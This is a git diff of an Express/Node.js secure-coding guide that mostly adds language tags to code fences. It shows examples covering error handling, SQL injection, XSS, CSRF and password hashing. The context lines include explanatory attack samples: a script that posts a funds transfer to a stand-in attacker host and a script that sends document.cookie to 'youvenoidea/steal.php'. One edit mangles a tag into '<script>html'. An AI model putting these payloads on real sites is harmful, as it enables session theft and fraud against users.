@@ -62,7 +62,7 @@
 
 #### Example  
 
-```
+```javascript
 var express = require('express');
 var bodyParser = require('body-parser');
 var app = express();
@@ -96,7 +96,7 @@ app.get('/', function(req, res, next){
 
 * Use `next('route')` when using multiple callback function in the route handler.
 
-```
+```javascript
 app.get('/foo',
 function checkRegistration (req, res, next){
   if(!req.user.registered){
@@ -123,7 +123,7 @@ function checkRegistration (req, res, next){
 
 * Using `next()` to pass an error(s) helps consolidate error processing into a single point in the application, instead of defining an error from within each route.
 
-```
+```javascript
 var express = require('express');
 var bodyParser = require('body-parser');
 var Sequelize = require('sequelize');
@@ -193,7 +193,7 @@ app.listen(3000);
 
   * When the headers have already been sent, delegate the default error handling mechanism in Express.
   
-```  
+```javascript
 function errorHandler (err, req, res, next) {
   if (res.headersSent) {
     return next(err)
@@ -232,9 +232,9 @@ id	username	role	password
 
 * Even though legitimate, the code is vulnerable to injections since anything can be passed into the query.
 
-```
+```javascript
 var sequelize = require('sequelize');
-​var​ app = express();
+var app = express();
 
 // app.use middleware here.
 
@@ -328,7 +328,7 @@ beast_bluevelvet
 
 * Validate that the role contains only letters.
 
-```
+```javascript
 var sequelize = require('sequelize');
 var app = express();
 
@@ -367,7 +367,7 @@ app.get('/mutants/:role', function(req, res, next){
 
 #### Implementation  
 
-```
+```javascript
 var sequelize = require('sequelize');
 var app = express();
 
@@ -412,7 +412,7 @@ Implementation
 
 * `Sequelize example`.
 
-```
+```javascript
 var sequelize = require('sequelize');
 var app = express();
 
@@ -447,7 +447,7 @@ app.get('/mutants/:role', function(req, res, next){
 
 * `Sequelize` example.
 
-```
+```javascript
 var sequelize = require('sequelize');
 var app = express();
 
@@ -556,7 +556,7 @@ app.get('/mutants/:role', function(req, res, next){
 * In this example an `XMLHttpRequest` is used to transfer funds from the victim to the attacker.
 
 ```
-<script>
+<script>html
   var xhr = new XMLHttpRequest();
   xhr.open('POST',http://youvenoidea.com/transfer',true);xhr.setRequestHeader('Content-type','application/x-www-form-urlencoded'); xhr.send('transfer[from]=5124834860&transfer[to_user_id]=48&transfer[amount]=1000&commit=Transfer');
   </script>
@@ -572,7 +572,7 @@ app.get('/mutants/:role', function(req, res, next){
 
 * The attacker then can wreak havoc in the victim's social media, bank accounts, etc.
 
-```
+```html
 <div>
   <h3>Security Alert</h3>
   <h4>Your session has expired.</h4>
@@ -592,7 +592,7 @@ app.get('/mutants/:role', function(req, res, next){
 
 * In this example an attacker targets a forms vulnerable field to inject a malicious image.
 
-```
+```html
 <script>
 new Image().src = 'http://youvenoidea/steal.php?cookies=' +  encodeURI(document.cookie);
 </script>
@@ -614,7 +614,7 @@ new Image().src = 'http://youvenoidea/steal.php?cookies=' +  encodeURI(document.
 
 * Apply after `body-parser`
 
-```
+```javascript
 //req.body.password = 'a <span>comment</span>';
 //req.body.username = " I'm-gonna-hack-you' ";
 
@@ -759,7 +759,7 @@ app.post('/login', function(request, response){
 
 * randomByes(): generates a random string.
 
-```
+```javascript
 'use strict';
 
 // Require Crypto module
@@ -813,7 +813,7 @@ hashPassword('password123!');
 
 * Your implementation may differ.
 
-```
+```javascript
 var config = {
     keylen: 512,
     digest: 'sha512'
